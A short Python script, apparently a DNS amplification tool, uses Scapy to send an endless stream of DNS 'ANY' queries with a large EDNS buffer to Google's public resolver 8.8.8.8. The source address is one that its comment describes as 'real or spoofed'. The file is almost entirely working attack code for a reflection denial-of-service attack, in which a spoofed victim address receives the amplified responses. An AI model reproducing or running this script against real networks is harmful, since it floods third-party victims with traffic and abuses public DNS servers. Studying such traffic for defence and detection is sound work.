import sys
import random
import time
from scapy.all import * # install med 'pip install scapy'

resolveDomain = "b.dk" # domain to resolve. Be aware some nameservers deny ANY requests
sourceIP4 = "192.168.1.104" # real or spoofed source
destinationIP4 = "8.8.8.8" # DNS server. Be aware some DNS servers deny ANY requests
queryType = "ALL" # DNS query type. A, MX, TXT, ALL

# choose random start source port
sourcePort = random.randint(49152,65535)
ipId = random.randint(0,0xffff)
dnsId = random.randint(0,0xffff)

while True:
	# create layers
	udp = UDP(sport=sourcePort)
	ip = IP(src=sourceIP4,dst=destinationIP4,ttl=128,id=ipId)
	dns = DNS(rd=1,id=dnsId,qd=DNSQR(qname=resolveDomain,qtype=queryType),ar=DNSRROPT(rclass=4096))
	
	# combine layers
	packet = ip/udp/dns
	
	# send packet
	send(packet, verbose=0)
	
	# print status
	if (sourcePort % 25) == 0:
		print("sent 25 packets")

	sourcePort += 1
	ipId += 1
	dnsId += 1

	time.sleep(0.1)
